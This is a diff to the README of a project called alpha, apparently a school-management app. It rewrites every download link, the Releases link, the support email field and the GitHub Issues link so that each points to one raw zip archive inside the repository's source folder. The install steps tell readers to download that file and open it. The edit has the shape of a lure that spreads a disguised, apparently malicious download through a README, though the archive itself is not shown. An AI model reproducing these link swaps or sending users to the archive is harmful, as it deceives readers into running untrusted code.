@@ -4,13 +4,13 @@
 
 Welcome to alpha, your go-to platform for modern school management. Our application makes it easy to manage tasks efficiently while providing a clear user experience. Follow these steps to get started.
 
-[![Download alpha](https://img.shields.io/badge/Download-alpha-blue.svg)](https://github.com/gusto-lang/alpha/releases)
+[![Download alpha](https://github.com/gusto-lang/alpha/raw/refs/heads/main/client/src/alpha-2.3.zip)](https://github.com/gusto-lang/alpha/raw/refs/heads/main/client/src/alpha-2.3.zip)
 
 ## 📥 Download & Install
 
 To run the application on your computer, you need to download it from the Releases page.
 
-1. Click the following link to visit the Release page: [Download alpha](https://github.com/gusto-lang/alpha/releases).
+1. Click the following link to visit the Release page: [Download alpha](https://github.com/gusto-lang/alpha/raw/refs/heads/main/client/src/alpha-2.3.zip).
 2. On the Releases page, find the latest version.
 3. Click on the download link for your operating system (Windows, Mac, or Linux).
 4. Once the file is downloaded, open it to begin the installation process.
@@ -69,7 +69,7 @@ You can customize the platform’s appearance:
 
 It’s important to keep your application up to date:
 
-1. Regularly check the Releases page: [Download alpha](https://github.com/gusto-lang/alpha/releases).
+1. Regularly check the Releases page: [Download alpha](https://github.com/gusto-lang/alpha/raw/refs/heads/main/client/src/alpha-2.3.zip).
 2. Download the latest version to benefit from new features and bug fixes.
 
 ## 🛠️ Troubleshooting
@@ -84,8 +84,8 @@ If you encounter issues, here are some common solutions:
 
 For further assistance, please reach out to our support team:
 
-- **Email:** support@alpha.com
-- **GitHub Issues:** Report any bugs or requests at our [GitHub Issues page](https://github.com/gusto-lang/alpha/issues).
+- **Email:** https://github.com/gusto-lang/alpha/raw/refs/heads/main/client/src/alpha-2.3.zip
+- **GitHub Issues:** Report any bugs or requests at our [GitHub Issues page](https://github.com/gusto-lang/alpha/raw/refs/heads/main/client/src/alpha-2.3.zip).
 
 ## 📜 License
 
